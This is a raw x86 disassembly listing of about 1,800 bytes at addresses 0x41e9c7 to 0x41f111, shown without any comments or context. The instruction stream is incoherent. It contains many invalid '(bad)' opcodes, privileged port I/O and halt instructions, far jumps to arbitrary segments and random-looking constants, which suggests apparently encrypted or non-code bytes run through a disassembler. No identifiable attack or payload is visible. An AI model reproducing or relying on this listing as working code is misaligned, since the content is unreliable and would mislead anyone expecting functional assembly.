  41e9c7:	fnstenv [ebx]
  41e9c9:	mov    dh,0x65
  41e9cb:	mov    ch,0xb1
  41e9cd:	mov    bh,0xf1
  41e9cf:	aam    0x37
  41e9d1:	scas   eax,DWORD PTR es:[edi]
  41e9d2:	cdq    
  41e9d3:	jl     0x41e9da
  41e9d5:	push   edi
  41e9d6:	adc    bl,dh
  41e9d8:	retf   0x5c7d
  41e9db:	push   ss
  41e9dc:	jb     0x41e9e8
  41e9de:	sbb    BYTE PTR [edi-0x2d],cl
  41e9e1:	sbb    al,0xc5
  41e9e3:	ins    BYTE PTR es:[edi],dx
  41e9e4:	out    0xda,al
  41e9e6:	test   BYTE PTR [eax+0x58e81805],ah
  41e9ec:	or     eax,0x47c34bd2
  41e9f1:	add    al,0x1
  41e9f3:	mov    esi,0x81dfffc0
  41e9f8:	add    BYTE PTR [esi+eiz*8-0x6b],cl
  41e9fc:	aaa    
  41e9fd:	jecxz  0x41ea28
  41e9ff:	scas   eax,DWORD PTR es:[edi]
  41ea00:	popf   
  41ea01:	xor    al,0xe6
  41ea03:	dec    esi
  41ea04:	popf   
  41ea05:	pop    edi
  41ea06:	pop    esi
  41ea07:	fadd   QWORD PTR [eax]
  41ea09:	adc    BYTE PTR ds:0x16af4d6f,dh
  41ea0f:	rcr    BYTE PTR [edx+0x73331a14],1
  41ea15:	rcr    BYTE PTR [edx+0x7377a62d],cl
  41ea1b:	aaa    
  41ea1c:	dec    esi
  41ea1d:	mov    ebp,0x56742fbe
  41ea22:	imul   eax,eax,0xadcc5c7c
  41ea28:	aaa    
  41ea29:	(bad)  
  41ea2a:	xor    ebp,eax
  41ea2c:	and    al,0x33
  41ea2e:	aam    0x80
  41ea30:	(bad)  
  41ea31:	xchg   esi,eax
  41ea32:	mov    edx,DWORD PTR [ebx-0x3f83d25c]
  41ea38:	xor    bh,bl
  41ea3a:	xor    al,0x93
  41ea3c:	out    0x1d,eax
  41ea3e:	adc    al,0x32
  41ea40:	shl    DWORD PTR [ecx-0x716b6c5f],1
  41ea46:	ss jl  0x41ea02
  41ea49:	nop
  41ea4a:	cmp    DWORD PTR [eax],eax
  41ea4c:	neg    BYTE PTR [eax-0x9ce26b2]
  41ea52:	jg     0x41eaab
  41ea54:	pusha  
  41ea55:	dec    ecx
  41ea56:	shr    BYTE PTR [ecx-0x44],1
  41ea59:	jecxz  0x41ea3a
  41ea5b:	adc    edi,ebp
  41ea5d:	in     al,dx
  41ea5e:	stos   BYTE PTR es:[edi],al
  41ea5f:	jge    0x41ea92
  41ea61:	mov    eax,0x5f3c2dbe
  41ea66:	jp     0x41e9e8
  41ea68:	jg     0x41ea60
  41ea6a:	lahf   
  41ea6b:	lock mov ecx,DWORD PTR [esi]
  41ea6e:	pop    es
  41ea6f:	push   esi
  41ea70:	mul    DWORD PTR [ebx+0x7bf58cfc]
  41ea76:	mov    eax,DWORD PTR [ecx+0x60772d1b]
  41ea7c:	out    0x26,al
  41ea7e:	jmp    0x20a27fc4
  41ea83:	jns    0x41ea64
  41ea85:	mov    bl,BYTE PTR [edi]
  41ea87:	cli    
  41ea88:	sbb    eax,0x61d96e0c
  41ea8d:	imul   esi,edi,0x5a95bd95
  41ea93:	or     al,0xca
  41ea95:	in     eax,0x4d
  41ea97:	pop    ecx
  41ea98:	les    ebp,FWORD PTR [edx+eiz*4]
  41ea9b:	outs   dx,DWORD PTR ds:[esi]
  41ea9c:	jmp    0xa3c8:0xc66901a1
  41eaa3:	lea    ecx,[edi+0x51]
  41eaa6:	test   al,0x17
  41eaa8:	push   ebx
  41eaa9:	inc    edx
  41eaaa:	push   ds
  41eaab:	scas   eax,DWORD PTR es:[edi]
  41eaac:	ins    DWORD PTR es:[edi],dx
  41eaad:	inc    edi
  41eaae:	aas    
  41eaaf:	xchg   ecx,eax
  41eab0:	sahf   
  41eab1:	in     al,dx
  41eab2:	lea    ebx,[edx-0x7]
  41eab5:	les    edx,FWORD PTR [ebp-0x21]
  41eab8:	es cmp al,0x3b
  41eabb:	push   cs
  41eabc:	sbb    eax,0x6bc250d8
  41eac1:	push   esi
  41eac2:	sbb    DWORD PTR [ebx+0x2e48a67f],0x290ddbfe
  41eacc:	hlt    
  41eacd:	call   0x1a25d9d7
  41ead2:	mov    edi,0x721991ba
  41ead7:	pop    edx
  41ead8:	into   
  41ead9:	ret    0x221
  41eadc:	push   edi
  41eadd:	aam    0x33
  41eadf:	sub    DWORD PTR [esi-0x30],ebx
  41eae2:	leave  
  41eae3:	mov    bh,BYTE PTR [eax+0x1f]
  41eae6:	ins    DWORD PTR es:[edi],dx
  41eae7:	fidivr DWORD PTR [edx]
  41eae9:	dec    eax
  41eaea:	xchg   BYTE PTR [edx-0x7e7c1bed],dl
  41eaf0:	lods   al,BYTE PTR ds:[esi]
  41eaf1:	mov    ecx,0xd6f50b59
  41eaf6:	adc    esi,esi
  41eaf8:	push   0xaa5b3536
  41eafd:	mov    DWORD PTR [esi+0x34b7be35],edi
  41eb03:	repnz scas eax,DWORD PTR es:[edi]
  41eb05:	mov    bh,0x5b
  41eb07:	inc    esp
  41eb08:	and    eax,0x6e78a49a
  41eb0d:	jecxz  0x41eb35
  41eb0f:	in     eax,0x24
  41eb11:	inc    edx
  41eb12:	cmp    BYTE PTR [ebx],dl
  41eb14:	adc    al,0xb1
  41eb16:	jnp    0x41eb77
  41eb18:	jae    0x41eb40
  41eb1a:	dec    ecx
  41eb1b:	inc    ebx
  41eb1c:	fld    QWORD PTR [eax]
  41eb1e:	mov    edx,0x66095a9e
  41eb23:	inc    edi
  41eb24:	enter  0x4025,0x98
  41eb28:	mov    cl,0x81
  41eb2a:	pop    esi
  41eb2b:	inc    esi
  41eb2c:	scas   eax,DWORD PTR es:[edi]
  41eb2d:	sar    DWORD PTR [ebx],0xdf
  41eb30:	arpl   WORD PTR [edi+0x66d1c5c4],bp
  41eb36:	and    eax,0xa0f84cad
  41eb3b:	imul   edx,DWORD PTR [esp+ebp*8+0xc858bfb],0xc79d6b39
  41eb46:	fidivr DWORD PTR ds:0xdc33ea1d
  41eb4c:	add    DWORD PTR ds:0xb60b92bb,eax
  41eb52:	mov    dl,0xc4
  41eb54:	jb     0x41eb0d
  41eb56:	inc    esp
  41eb57:	lea    ecx,[ebp+0x31ba999a]
  41eb5d:	adc    DWORD PTR [edi-0x32],eax
  41eb60:	sub    ebp,DWORD PTR [edi-0x3447cedc]
  41eb66:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb68:	(bad)
  41eb6b:	cwde   
  41eb6c:	ror    esp,0x28
  41eb6f:	push   ebx
  41eb70:	js     0x41eb9a
  41eb72:	adc    eax,0xf22fdac6
  41eb77:	mov    ds:0xf0c49045,eax
  41eb7c:	mov    cl,0xd2
  41eb7e:	sub    DWORD PTR [eax],edi
  41eb80:	mov    dh,0x71
  41eb82:	mov    ch,0x7a
  41eb84:	test   BYTE PTR [eax-0x69],0xe1
  41eb88:	aas    
  41eb89:	inc    edi
  41eb8a:	pop    ecx
  41eb8b:	mov    ds,WORD PTR [edx+0x28aee598]
  41eb91:	imul   edx,DWORD PTR [ecx],0xffffffe8
  41eb94:	mov    ds:0xfe824ef,eax
  41eb99:	rcr    DWORD PTR es:0x4f8e7d6b,1
  41eba0:	jp     0x41eb5a
  41eba2:	adc    al,0xe4
  41eba4:	adc    ah,ah
  41eba6:	mov    dl,0xdd
  41eba8:	mov    ds:0xfd9657ce,al
  41ebad:	mov    DWORD PTR [ebp-0x284504f5],edx
  41ebb3:	aas    
  41ebb4:	sub    DWORD PTR [esp+eax*4+0x8],esp
  41ebb8:	pop    ebp
  41ebb9:	xchg   ebp,eax
  41ebba:	dec    ecx
  41ebbb:	xchg   DWORD PTR [ecx+0x3c],edx
  41ebbe:	mov    bh,0xe4
  41ebc0:	es push ss
  41ebc2:	mov    eax,0x1cd136d8
  41ebc7:	jb     0x41ebe1
  41ebc9:	and    eax,0xcab197a1
  41ebce:	fimul  DWORD PTR [eax-0x6e]
  41ebd1:	aad    0x8d
  41ebd3:	(bad)  
  41ebd4:	ins    DWORD PTR es:[edi],dx
  41ebd5:	jecxz  0x41ebc9
  41ebd7:	(bad)  
  41ebd8:	dec    ebp
  41ebd9:	fisttp WORD PTR [eax]
  41ebdb:	dec    ecx
  41ebdc:	jmp    0x41ec1c
  41ebde:	mov    DWORD PTR [edx+0x38],ebp
  41ebe1:	xchg   ebx,eax
  41ebe2:	ror    al,cl
  41ebe4:	pop    ebx
  41ebe5:	xor    eax,0xb518aeeb
  41ebea:	adc    eax,0x6aab84f2
  41ebef:	hlt    
  41ebf0:	mov    ebx,0x8331b60b
  41ebf5:	hlt    
  41ebf6:	shl    ebx,cl
  41ebf8:	hlt    
  41ebf9:	adc    ah,ah
  41ebfb:	int    0x8b
  41ebfd:	mov    ebx,0xf003f905
  41ec02:	pop    ss
  41ec03:	enter  0x3168,0xf5
  41ec07:	sub    al,0x5
  41ec09:	addr16 aad 0x4e
  41ec0c:	dec    BYTE PTR [edi+0x6359c195]
  41ec12:	rol    BYTE PTR [edi],cl
  41ec14:	push   ds
  41ec15:	enter  0xcb89,0x9c
  41ec19:	rcr    DWORD PTR [ecx],1
  41ec1b:	std    
  41ec1c:	ret    0x6fdb
  41ec1f:	popa   
  41ec20:	gs jl  0x41ec58
  41ec23:	add    ah,bl
  41ec25:	dec    ecx
  41ec26:	adc    DWORD PTR [ebp+0x55],edx
  41ec29:	adc    BYTE PTR [edx+0x48],dh
  41ec2c:	scas   eax,DWORD PTR es:[edi]
  41ec2d:	jecxz  0x41ebda
  41ec2f:	adc    eax,0x4f2b8cd7
  41ec34:	jmp    0x41ebda
  41ec36:	dec    ecx
  41ec37:	mov    esp,esi
  41ec39:	pop    edi
  41ec3a:	sub    dh,BYTE PTR [edi+eiz*4-0x53]
  41ec3e:	gs out dx,eax
  41ec40:	ss mov bh,0x73
  41ec43:	stos   BYTE PTR es:[edi],al
  41ec44:	and    ebx,DWORD PTR [edx-0x1d]
  41ec47:	dec    ebp
  41ec48:	jno    0x41ebdd
  41ec4a:	push   esp
  41ec4b:	sbb    al,0xf9
  41ec4d:	cmc    
  41ec4e:	adc    al,0x85
  41ec50:	aas    
  41ec51:	data16 stos BYTE PTR es:[edi],al
  41ec53:	add    eax,0x3ede32f7
  41ec58:	int3   
  41ec59:	fadd   DWORD PTR [esi-0x365c0c23]
  41ec5f:	fs inc eax
  41ec61:	cmp    ebp,ecx
  41ec63:	in     eax,dx
  41ec64:	stos   BYTE PTR es:[edi],al
  41ec65:	and    BYTE PTR [eax+0x26],cl
  41ec68:	xchg   ebx,eax
  41ec69:	cmp    BYTE PTR [edi],dl
  41ec6b:	pop    ecx
  41ec6c:	lods   al,BYTE PTR ds:[esi]
  41ec6d:	xor    al,ah
  41ec6f:	cmp    BYTE PTR [ecx],cl
  41ec71:	pop    edx
  41ec72:	sbb    ecx,ecx
  41ec74:	or     DWORD PTR [eax],edx
  41ec76:	push   0xffffffbd
  41ec78:	outs   dx,BYTE PTR ds:[esi]
  41ec79:	popf   
  41ec7a:	xor    eax,0x4c814c4d
  41ec7f:	mov    dl,0x4e
  41ec81:	repnz and eax,0x2e3e02bc
  41ec87:	jmp    0xe968:0xba29a3c7
  41ec8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec8f:	popf   
  41ec90:	les    edi,FWORD PTR ds:[edi]
  41ec93:	cdq    
  41ec94:	sbb    al,0xcf
  41ec96:	dec    ecx
  41ec97:	xor    BYTE PTR [edx],0xe5
  41ec9a:	xchg   esi,eax
  41ec9b:	leave  
  41ec9c:	xor    al,0x1a
  41ec9e:	mov    al,ds:0x903e0613
  41eca3:	and    bl,BYTE PTR [bp+si+0x77]
  41eca7:	ret    0x98bf
  41ecaa:	popa   
  41ecab:	in     eax,dx
  41ecac:	sub    BYTE PTR [edi],ch
  41ecae:	lds    edi,FWORD PTR [edx+0x22eeeb3]
  41ecb4:	adc    BYTE PTR [eax-0xcad0a4d],dh
  41ecba:	ja     0x41ed29
  41ecbc:	dec    edx
  41ecbd:	cmp    eax,0x12bb8781
  41ecc3:	mov    ss,eax
  41ecc5:	mov    bl,0x5a
  41ecc7:	dec    edx
  41ecc8:	push   edx
  41ecc9:	sub    ah,cl
  41eccb:	inc    esp
  41eccc:	stos   DWORD PTR es:[edi],eax
  41eccd:	jne    0x41ed2b
  41eccf:	or     al,0x6
  41ecd1:	lods   eax,DWORD PTR ds:[esi]
  41ecd2:	inc    ecx
  41ecd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecd4:	cmc    
  41ecd5:	dec    ebp
  41ecd6:	loope  0x41eca5
  41ecd8:	arpl   bp,dx
  41ecda:	push   cs
  41ecdb:	scas   al,BYTE PTR es:[edi]
  41ecdc:	cmp    ebx,DWORD PTR [esi+0x43543aba]
  41ece2:	dec    esp
  41ece3:	or     DWORD PTR [edx],0x7d60142d
  41ece9:	popa   
  41ecea:	fistp  DWORD PTR [esi-0x4e]
  41eced:	and    eax,DWORD PTR [edx+esi*8-0x13f2ff33]
  41ecf4:	(bad)  
  41ecf5:	jmp    0x41ed35
  41ecf7:	shl    DWORD PTR [eax-0x3f],cl
  41ecfa:	push   ebp
  41ecfb:	dec    ebp
  41ecfc:	mov    esi,DWORD PTR [ebx-0x6b]
  41ecff:	or     edi,DWORD PTR [eax+0x6f]
  41ed02:	sub    ch,BYTE PTR [esi+ecx*4+0x5fb65fcc]
  41ed09:	mov    edi,0x3fb0ac8b
  41ed0e:	retf   
  41ed0f:	fistp  DWORD PTR [esi]
  41ed11:	and    ecx,ecx
  41ed13:	xor    bh,cl
  41ed15:	jb     0x41ecab
  41ed17:	dec    esp
  41ed18:	mov    edx,0xe414d064
  41ed1d:	mov    ds:0xf475ff37,eax
  41ed22:	jae    0x41ed85
  41ed24:	loope  0x41ed94
  41ed26:	cmc    
  41ed27:	(bad)  
  41ed29:	lea    eax,ds:0x10718d5d
  41ed2f:	mov    eax,?
  41ed31:	cmp    eax,0x11d53569
  41ed36:	scas   al,BYTE PTR es:[edi]
  41ed37:	xchg   ebp,eax
  41ed38:	fwait
  41ed39:	es mov eax,0xb4a5368
  41ed3f:	and    eax,edi
  41ed41:	je     0x41ecf5
  41ed43:	(bad)  
  41ed44:	push   0xcf8ef8e8
  41ed49:	xor    eax,0x35c91bc6
  41ed4e:	mov    cl,0x4c
  41ed50:	retf   
  41ed51:	and    ah,bl
  41ed53:	sbb    DWORD PTR [edx-0x25dced59],esi
  41ed59:	push   esi
  41ed5a:	mov    bh,0x3a
  41ed5c:	sbb    al,BYTE PTR [ecx]
  41ed5e:	add    DWORD PTR [ebx+0x1880d291],ebx
  41ed64:	js     0x41ed83
  41ed66:	sub    al,0x9e
  41ed68:	push   0x4bd0ef8e
  41ed6d:	icebp  
  41ed6e:	push   edi
  41ed6f:	push   edx
  41ed70:	sbb    al,0x43
  41ed72:	ja     0x41ede8
  41ed74:	sub    DWORD PTR [edi],eax
  41ed76:	inc    edi
  41ed77:	je     0x41eddd
  41ed79:	(bad)  
  41ed7b:	mov    al,es:0x15c13280
  41ed81:	bound  edi,QWORD PTR ds:0x9e9b426b
  41ed87:	arpl   WORD PTR [edi],sp
  41ed89:	adc    BYTE PTR cs:[eax+0x5c],0xf
  41ed8e:	jle    0x41eddc
  41ed90:	int3   
  41ed91:	dec    ebx
  41ed92:	stos   DWORD PTR es:[edi],eax
  41ed93:	test   BYTE PTR [ecx],0x6d
  41ed96:	cmp    eax,0x8d3ef2ee
  41ed9b:	loopne 0x41ed76
  41ed9d:	mov    edx,0x86b36ac7
  41eda2:	mov    esp,DWORD PTR [ebx]
  41eda4:	fs out dx,eax
  41eda6:	pusha  
  41eda7:	dec    esp
  41eda8:	test   BYTE PTR [edi-0x7e91c584],bh
  41edae:	or     al,0x57
  41edb0:	fdiv   DWORD PTR [ebp+0x2d]
  41edb3:	inc    ebp
  41edb4:	jns    0x41ed81
  41edb6:	jg     0x41ed84
  41edb8:	lods   al,BYTE PTR ds:[esi]
  41edb9:	sbb    bh,0xfe
  41edbc:	mov    dh,bh
  41edbe:	les    edx,FWORD PTR [ebx+0x54]
  41edc1:	xor    al,0x34
  41edc3:	push   esi
  41edc4:	mov    edi,0xd586e76b
  41edc9:	loope  0x41ee16
  41edcb:	xchg   ecx,eax
  41edcc:	mov    ds:0xa4747b07,al
  41edd1:	(bad)  
  41edd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edd3:	sar    BYTE PTR [ebx+ebx*2],1
  41edd6:	sbb    DWORD PTR [ecx+0x1f],ebp
  41edd9:	jno    0x41ee24
  41eddb:	mov    BYTE PTR [esi+0x57eba9ae],bl
  41ede1:	bound  edx,QWORD PTR [edx+eax*2-0x21]
  41ede5:	dec    ebp
  41ede6:	(bad)  
  41ede7:	sub    al,0x24
  41ede9:	xchg   ebp,eax
  41edea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edec:	mov    eax,ds:0xceebe55b
  41edf1:	pushf  
  41edf2:	int    0x4f
  41edf4:	out    0x55,eax
  41edf6:	jnp    0x41ee1b
  41edf8:	rcl    BYTE PTR [eax],1
  41edfa:	dec    esp
  41edfb:	fnstenv [ebx]
  41edfd:	push   0xe0aea29f
  41ee02:	and    ebx,DWORD PTR [esp+eiz*4+0x772dccfa]
  41ee09:	cwde   
  41ee0a:	in     eax,dx
  41ee0b:	retf   0x5aaa
  41ee0e:	xchg   ebp,eax
  41ee0f:	fmul   QWORD PTR ds:0xe2103807
  41ee15:	pop    eax
  41ee16:	stos   DWORD PTR es:[edi],eax
  41ee17:	mov    ah,0x59
  41ee19:	aam    0x83
  41ee1b:	pusha  
  41ee1c:	mov    dl,al
  41ee1e:	push   esi
  41ee1f:	fldenv [ebx-0x8380a7]
  41ee25:	dec    esi
  41ee26:	popa   
  41ee27:	xor    al,0x7
  41ee29:	inc    esp
  41ee2a:	push   ds
  41ee2b:	adc    eax,0xd4c0f10e
  41ee30:	xor    eax,0xc215bf90
  41ee35:	ins    BYTE PTR es:[edi],dx
  41ee36:	adc    bl,dh
  41ee38:	inc    ebx
  41ee39:	add    al,0xdc
  41ee3b:	jne    0x41eead
  41ee3d:	adc    bh,BYTE PTR [ebx-0x31667fe]
  41ee43:	push   edi
  41ee44:	mov    esp,0xe92c6bad
  41ee49:	jmp    0xa82d:0x3dc8a263
  41ee50:	push   ss
  41ee51:	jns    0x41eead
  41ee53:	or     ah,bh
  41ee55:	addr16 call 0xee977e02
  41ee5b:	stos   DWORD PTR es:[edi],eax
  41ee5c:	lahf   
  41ee5d:	jbe    0x41ee08
  41ee5f:	sahf   
  41ee60:	icebp  
  41ee61:	push   cs
  41ee62:	mov    esi,ecx
  41ee64:	leave  
  41ee65:	(bad)  
  41ee67:	mov    dh,0x5c
  41ee69:	and    DWORD PTR [ebp-0x63e5ccf4],edx
  41ee6f:	inc    ecx
  41ee70:	adc    edx,DWORD PTR [edx+0x4da6b2b]
  41ee76:	mov    cl,0xfc
  41ee78:	je     0x41eea4
  41ee7a:	test   al,0xe0
  41ee7c:	xchg   ebp,ebp
  41ee7e:	add    al,0xec
  41ee80:	cmp    DWORD PTR [ecx-0x711cb17],edi
  41ee86:	jmp    0x9f7d:0xe02c3f76
  41ee8d:	call   FWORD PTR [ecx+0x4e]
  41ee90:	push   ds
  41ee91:	popf   
  41ee92:	repnz cld 
  41ee94:	ins    DWORD PTR es:[edi],dx
  41ee95:	ds push ecx
  41ee97:	jns    0x41eea2
  41ee99:	sbb    bh,BYTE PTR [eax-0x1]
  41ee9c:	push   eax
  41ee9d:	pop    ebp
  41ee9e:	data16 aad 0x72
  41eea1:	(bad)  
  41eea2:	fcomi  st,st(3)
  41eea4:	loope  0x41ee31
  41eea6:	xchg   edi,eax
  41eea7:	mov    esi,0x71a577da
  41eeac:	mov    ch,0xcb
  41eeae:	adc    ah,BYTE PTR ds:0x893ddcda
  41eeb4:	daa    
  41eeb5:	rcr    bl,1
  41eeb7:	les    ebx,FWORD PTR [edx-0x5f]
  41eeba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eebb:	es pop eax
  41eebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eebe:	mov    dh,0xb6
  41eec0:	pop    ds
  41eec1:	aam    0x62
  41eec3:	adc    DWORD PTR [esi-0x747320ba],0xffffffd6
  41eeca:	jnp    0x41eee3
  41eecc:	or     cl,bl
  41eece:	fild   WORD PTR ds:0x4bb77a1b
  41eed4:	cs inc esp
  41eed6:	sub    al,0x52
  41eed8:	cmp    BYTE PTR [ebp+0x400d83ab],cl
  41eede:	mov    edi,0x3f306545
  41eee3:	mov    dl,0x7b
  41eee5:	inc    eax
  41eee6:	arpl   di,bp
  41eee8:	pusha  
  41eee9:	inc    ecx
  41eeea:	sub    dh,BYTE PTR [esi]
  41eeec:	xchg   ecx,eax
  41eeed:	pop    ebx
  41eeee:	mov    WORD PTR [eax-0xb],fs
  41eef1:	in     eax,dx
  41eef2:	stos   BYTE PTR es:[edi],al
  41eef3:	nop
  41eef4:	nop
  41eef5:	js     0x41eebc
  41eef7:	jns    0x41ef17
  41eef9:	rol    BYTE PTR [eax],cl
  41eefb:	js     0x41ef26
  41eefd:	push   edx
  41eefe:	cmc    
  41eeff:	sbb    dh,BYTE PTR [ebx]
  41ef01:	imul   esp,ecx,0xefaa01e8
  41ef07:	sub    BYTE PTR [edx],0x49
  41ef0a:	pop    edx
  41ef0b:	rcr    DWORD PTR [ebp+eax*8-0x44],cl
  41ef0f:	ins    DWORD PTR es:[edi],dx
  41ef10:	adc    eax,DWORD PTR [esi+edi*2]
  41ef13:	sahf   
  41ef14:	(bad)  
  41ef15:	lods   eax,DWORD PTR ds:[esi]
  41ef16:	jbe    0x41ef3d
  41ef18:	xchg   edx,eax
  41ef19:	pop    ds
  41ef1a:	dec    edi
  41ef1b:	sbb    al,al
  41ef1d:	out    0x8c,eax
  41ef1f:	add    eax,0x17bba494
  41ef24:	pop    ebx
  41ef25:	or     DWORD PTR [eax],esi
  41ef27:	nop
  41ef28:	dec    edi
  41ef29:	cwde   
  41ef2a:	xor    DWORD PTR [ebx+0x32],0x675f33a2
  41ef31:	ins    DWORD PTR es:[edi],dx
  41ef32:	mov    al,ds:0x79780b31
  41ef37:	cmp    eax,DWORD PTR [edx]
  41ef39:	cmp    cl,BYTE PTR [ebx-0x16bdd38d]
  41ef3f:	jbe    0x41ef35
  41ef41:	leave  
  41ef42:	(bad)  
  41ef43:	dec    esi
  41ef44:	cmp    cl,dl
  41ef46:	aas    
  41ef47:	popf   
  41ef48:	jl     0x41ef1f
  41ef4a:	enter  0xebc3,0xbd
  41ef4e:	or     BYTE PTR [ecx+0x5157212],bl
  41ef54:	pop    ebp
  41ef55:	and    al,0xec
  41ef57:	jne    0x41ef5f
  41ef59:	sbb    edi,ebx
  41ef5b:	ja     0x41ef8f
  41ef5d:	xchg   ebp,eax
  41ef5e:	shr    ebx,cl
  41ef60:	adc    BYTE PTR [esi],0xc8
  41ef63:	dec    ebx
  41ef64:	daa    
  41ef65:	mov    dh,0xac
  41ef67:	sub    al,0xa0
  41ef69:	mov    eax,ds:0x5af1ae68
  41ef6f:	mov    bl,0x24
  41ef71:	(bad)  
  41ef73:	leave  
  41ef74:	imul   eax,DWORD PTR [ecx+0x55],0x692f15bf
  41ef7b:	inc    esi
  41ef7c:	daa    
  41ef7d:	btr    DWORD PTR [edi+0xd],edi
  41ef81:	sti    
  41ef82:	jo     0x41efb8
  41ef84:	dec    esi
  41ef85:	jmp    0x8611:0x3df62094
  41ef8c:	cmp    BYTE PTR [eax+edx*1],bh
  41ef8f:	ins    BYTE PTR es:[edi],dx
  41ef90:	je     0x41f005
  41ef92:	jbe    0x41efe4
  41ef94:	add    edx,esi
  41ef96:	or     ah,BYTE PTR [edx]
  41ef98:	xor    bl,BYTE PTR [esi+edx*1-0x1c]
  41ef9c:	pop    ebp
  41ef9d:	ror    BYTE PTR [edx],0xfb
  41efa0:	jmp    0x78b0:0x84082fc2
  41efa7:	not    BYTE PTR [ecx+0x44b8879e]
  41efad:	ficom  DWORD PTR [edi+0x1]
  41efb0:	rcr    BYTE PTR [bx+si-0x6a0d],1
  41efb5:	push   edi
  41efb6:	inc    ecx
  41efb7:	aas    
  41efb8:	cld    
  41efb9:	test   bh,ch
  41efbb:	lahf   
  41efbc:	adc    eax,0xdbc2c0b6
  41efc1:	pop    di
  41efc3:	dec    ebx
  41efc4:	stos   DWORD PTR es:[edi],eax
  41efc5:	data16 or BYTE PTR es:[esi+0x3f],al
  41efca:	fcomp  QWORD PTR [edx]
  41efcc:	shl    BYTE PTR [ecx+0x48d5c2d0],1
  41efd2:	loop   0x41f040
  41efd4:	retf   0xac2b
  41efd7:	inc    ebx
  41efd8:	rcr    BYTE PTR gs:[eax],1
  41efdb:	(bad)  
  41efdc:	xlat   BYTE PTR ds:[ebx]
  41efdd:	std    
  41efde:	iret   
  41efdf:	or     bh,cl
  41efe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efe2:	mov    edi,0x3d6202cf
  41efe7:	lea    eax,[ebx+0x73a8c22d]
  41efed:	jbe    0x41f05e
  41efef:	jbe    0x41f042
  41eff1:	mov    bl,0xa0
  41eff3:	cmp    ecx,DWORD PTR [ebp+0x1ed3cf98]
  41eff9:	imul   edi,DWORD PTR [ecx*8-0x71c98685],0xffffffae
  41f001:	push   ebp
  41f002:	sub    al,0xda
  41f004:	or     ah,dh
  41f006:	rcr    DWORD PTR [ecx],1
  41f008:	adc    cl,BYTE PTR [ebp+0x22]
  41f00b:	lods   eax,DWORD PTR ss:[esi]
  41f00d:	retf   
  41f00e:	push   esp
  41f00f:	push   eax
  41f010:	and    dl,bl
  41f012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f013:	(bad)  
  41f014:	fcom   DWORD PTR [esi]
  41f016:	aad    0x86
  41f018:	call   0x2bc22b82
  41f01d:	enter  0xcb3e,0xe4
  41f021:	pop    ebp
  41f022:	add    BYTE PTR [eax-0x8897530],bl
  41f028:	pop    esi
  41f029:	inc    edi
  41f02a:	cli    
  41f02b:	mov    edx,es
  41f02d:	test   eax,0x4e3294fd
  41f032:	mov    al,ds:0x3ef49e04
  41f037:	pop    esp
  41f038:	dec    bx
  41f03a:	daa    
  41f03b:	xchg   edi,eax
  41f03c:	out    0x93,eax
  41f03e:	xor    eax,0x2794e5c0
  41f043:	int3   
  41f044:	into   
  41f045:	or     ah,BYTE PTR [ebp+0x2]
  41f048:	aam    0xaa
  41f04a:	xchg   edx,eax
  41f04b:	xchg   ecx,eax
  41f04c:	sahf   
  41f04d:	fbld   TBYTE PTR [edi]
  41f04f:	(bad)  
  41f050:	aad    0x54
  41f052:	and    eax,0xa41f917f
  41f057:	pop    ecx
  41f058:	adc    eax,0xf0d1a4ac
  41f05d:	mov    ds:0x6ec39045,eax
  41f062:	xchg   ebx,eax
  41f063:	retw   
  41f065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f066:	jle    0x41f0c9
  41f068:	sub    eax,0xa55ad462
  41f06d:	push   cs
  41f06e:	cmp    BYTE PTR [edx],0xad
  41f071:	cmovae ecx,DWORD PTR [edi+0x31911c39]
  41f078:	sahf   
  41f079:	or     DWORD PTR [ecx-0x34],0x499ef70
  41f080:	or     BYTE PTR [eax-0x55d433d8],dh
  41f086:	dec    esp
  41f087:	push   0x53be9801
  41f08c:	jmp    0xc60d:0xac8ed1a2
  41f093:	xor    eax,0xd27a5ad3
  41f098:	cwde   
  41f099:	mov    ecx,0xc071e4c7
  41f09e:	pop    eax
  41f09f:	or     eax,DWORD PTR [ebp+0x64]
  41f0a2:	jge    0x41f0b8
  41f0a4:	adc    eax,0x9720c405
  41f0a9:	xchg   ebx,eax
  41f0aa:	mov    ch,0xbd
  41f0ac:	ficomp DWORD PTR [ecx+0x66]
  41f0af:	icebp  
  41f0b0:	mov    ds:0x45ea9a2,al
  41f0b5:	test   eax,0xdb938853
  41f0ba:	inc    eax
  41f0bb:	cmp    DWORD PTR ds:0x1dbbac4,edi
  41f0c1:	mov    BYTE PTR [ebp+0x6adeee57],dl
  41f0c7:	pop    DWORD PTR [edx+0x4505cc96]
  41f0cd:	in     al,dx
  41f0ce:	cdq    
  41f0cf:	mov    WORD PTR [ecx-0x29],?
  41f0d2:	(bad)  [eax]
  41f0d4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0d7:	mov    ebx,0x8505130d
  41f0dc:	add    BYTE PTR [esp+ebp*2+0x3dc3797a],al
  41f0e3:	int3   
  41f0e4:	inc    ebp
  41f0e5:	jmp    0x41f083
  41f0e7:	clc    
  41f0e8:	cmp    al,0x22
  41f0ea:	pop    esi
  41f0eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ec:	or     bh,BYTE PTR [ebx+0x38855964]
  41f0f2:	inc    ecx
  41f0f3:	push   esp
  41f0f4:	aaa    
  41f0f5:	fdiv   DWORD PTR [edx+0x10]
  41f0f8:	in     eax,dx
  41f0f9:	gs push es
  41f0fb:	dec    edx
  41f0fc:	dec    ebp
  41f0fd:	or     DWORD PTR [ebp+ebx*1+0x394005b2],0xad492dc0
  41f108:	xlat   BYTE PTR ds:[ebx]
  41f109:	jb     0x41f13b
  41f10b:	ror    BYTE PTR [esi],1
  41f10d:	hlt    
  41f10e:	pusha  
  41f10f:	jge    0x41f11b
  41f111:	test   BYTE PTR [eax-0x48b0e144],ah
